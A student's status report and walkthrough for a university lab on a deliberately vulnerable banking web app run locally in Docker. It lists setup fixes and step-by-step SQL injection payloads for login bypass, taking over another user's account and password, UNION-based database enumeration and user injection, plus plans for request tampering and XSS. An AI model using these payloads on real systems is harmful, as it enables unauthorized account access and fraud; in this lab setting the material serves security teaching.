# vBank Lab Report - Status & Guide

**Author:** Ghazal  
**Project:** Security Insider Lab II - vBank (Sphinx) Vulnerable Web Application  
**For:** Seth (teammate)

---

## Overview

This document summarizes what we've done, the challenges encountered, and what still needs to be completed. Use this as a reference when working on the report or continuing with the remaining exercises.

---

## Exercise 1: Setup (COMPLETED)

### What we did:
- Installed Docker and ran the vBank application using Docker Compose
- Three containers: PHP/Apache web server (port 8080), MySQL 8.0 (port 3306), phpMyAdmin (port 8081)
- Imported `vbank.sql` database via phpMyAdmin

### Issues & Fixes:

1. **Missing mysqli extension**
   - The `php:8.1-apache` image doesn't include the `mysqli` PHP extension
   - Created a `Dockerfile` with `RUN docker-php-ext-install mysqli`
   - Changed `docker-compose.yml` from `image: php:8.1-apache` to `build: .`

2. **Include path mismatch**
   - `index.php` and `login.php` had `../etc/` and `../pages/` in include paths
   - Files are mounted at `/var/www/html/`, so paths should be `./etc/` and `./pages/`
   - Fixed in both `index.php:12` and `login.php:2`

3. **Deprecated `each()` function (PHP 8)**
   - `each()` was removed in PHP 8.0
   - Replaced with `foreach` loops in `index.php` and `htb.inc`

4. **Deprecated `eregi()` function**
   - Replaced with `preg_match()` in `htb.inc:98`

5. **Deprecated `mysql_*` functions**
   - Replaced `mysql_errno()` and `mysql_error()` with `mysqli_errno()` and `mysqli_error()` in `htb.inc`

6. **Database connection config**
   - `config.php` had hardcoded `127.0.0.1` as DB host and password `aaa`
   - In Docker, DB is in a separate container named `db` with password `root`
   - Updated to use environment variables: `getenv('DB_HOST')`, `getenv('DB_PASSWORD')`, etc.

7. **Path prefix**
   - Changed `$htbconf['paths/prefix']` from `/var/www/vBank/` to `/var/www/html/`

---

## Exercise 2: Client/Server Side Scripting (PARTIALLY DONE - NEEDS IMPROVEMENT)

### What we identified:
- The login form uses `checkform()` from `htb.js` for client-side validation
- It only allows alphanumeric characters (`[a-zA-Z0-9]`) in username and password
- The server (`login.php`) performs NO input validation - it directly concatenates input into SQL queries

### What we did:
- Used browser Console to bypass: `document.loginForm.submit()`
- Successfully bypassed client-side validation
- Reached the server (got server errors, proving bypass worked)

### Why I'm NOT satisfied:
1. We used the Console method which is not ideal for screenshots/documentation
2. The cleaner method is **disabling JavaScript** in browser settings (`about:config` → `javascript.enabled = false`)
3. With JS disabled, we can type SQL payloads directly in the form fields and click Login
4. We need proper screenshots showing:
   - The JS validation in `htb.js`
   - The form with special characters in the fields
   - The successful bypass result

### What Seth should do:
1. **Disable JavaScript** in Firefox: `about:config` → `javascript.enabled` → set to `false`
2. Refresh the login page
3. Enter in the form:
   - Username: `' or 'a'='a`
   - Password: `x`
4. Click Login - should bypass and log in as alex
5. Take screenshots of each step

---

## Exercise 3: SQL Injection (NOT STARTED)

### What needs to be done:

**Step 1: Fix PHP 8 compatibility in `htbchgpwd.page`**
- The password change page uses deprecated `mysql_query()` function
- This will throw a fatal error on PHP 8.1
- Need to change `mysql_query()` to `mysqli_query()` and pass `$db_link` as second parameter
- The file is at: `app/pages/htbchgpwd.page`

**Step 2: Login bypass (creative approach)**
- Disable JavaScript in browser
- Login with:
  - Username: `' or 'a'='a`
  - Password: `x`
- This makes the query: `SELECT * FROM users where username='' or 'a'='a' and password='x'`
- Logs in as first user (alex)
- **Screenshot:** Welcome page

**Step 3: Change your own password**
- Go to password change page
- Old password: `' or 'a'='a`
- New password: `hacked`
- Retype: `hacked`
- **Screenshot:** Success message

**Step 4: Change another user's password (bob)**
- Log out
- Disable JS again
- Login as bob:
  - Username: `' or username='bob'#`
  - Password: `x`
- This makes the query: `SELECT * FROM users where username='' or username='bob'##' and password='x'`
- Go to password change and change bob's password
- **Screenshot:** Welcome page showing "Bob Obby"

### Code to fix in `htbchgpwd.page`:

Line 13: Change `mysql_query($sql, $db_link)` to `mysqli_query($db_link, $sql)`
Line 17: Change `mysql_num_rows($result)` to `mysqli_num_rows($result)`
Line 27: Change `mysql_query($sql, $db_link)` to `mysqli_query($db_link, $sql)`

---

## Exercise 4: SQL Injection - Create New User (NOT STARTED)

### What needs to be done:
1. Use UNION-based injection to enumerate database structure
2. Find number of columns using `ORDER BY` injection
3. Identify which columns are displayed on the page using `UNION SELECT`
4. Inject a fake user via UNION SELECT payload

### Key payloads:
- Find columns: `' ORDER BY 1 --` (increment until error)
- Find displayed columns: `' UNION SELECT 1,2,3,4,5,6,7,8 --`
- Get database info: `' UNION SELECT 1,2,database(),4,5,6,7,8 --`
- Get table names: `' UNION SELECT 1,2,group_concat(table_name),4,5,6,7,8 FROM information_schema.tables WHERE table_schema='vbank' --`
- Create fake user: `' UNION SELECT 99,'hacker','hacker','Passau','Student',NULL,NULL,NULL --`

---

## Exercise 5: Request Manipulation (NOT STARTED)

### What needs to be done:
1. Install a proxy tool (Burp Suite or OWASP ZAP)
2. Intercept loan request
3. Modify interest rate parameter (e.g., change from 4.2 to 0)
4. Forward modified request

---

## Exercise 6: XSS (NOT STARTED)

### What needs to be done:
1. Find a field that reflects input (e.g., transfer remark)
2. Inject JavaScript payload
3. Demonstrate script execution

---

## Important Notes

### Test credentials:
- alex / 413Xp455
- bob / b0BP4S5

### Docker commands:
```bash
cd /Users/poures/Desktop/PC/insider-lab/vBank
docker-compose down
docker-compose up --build -d
```

### URLs:
- Application: http://localhost:8080
- phpMyAdmin: http://localhost:8081 (root/root)

### Files modified so far:
- `Dockerfile` (created)
- `docker-compose.yml` (changed `image:` to `build:`)
- `app/index.php` (include paths, each() fix, login constant quote)
- `app/login.php` (include paths)
- `app/etc/config.php` (DB credentials, path prefix)
- `app/etc/htb.inc` (each(), eregi(), mysql_* fixes, errorHandler default param)

### Still needs fixing:
- `app/pages/htbchgpwd.page` - change `mysql_query()` to `mysqli_query()` for PHP 8

---

## Report Structure

The LaTeX chapter files are at:
- `setup_chapter.tex` - Exercise 1
- `exercise2_chapter.tex` - Exercise 2

Images are in:
- `images/` - Exercise 1 screenshots
- `insider-lab/agent/images/exercise-2/` - Exercise 2 screenshots

The main PDF reference is at: `insider-lab/Lab_4.pdf`
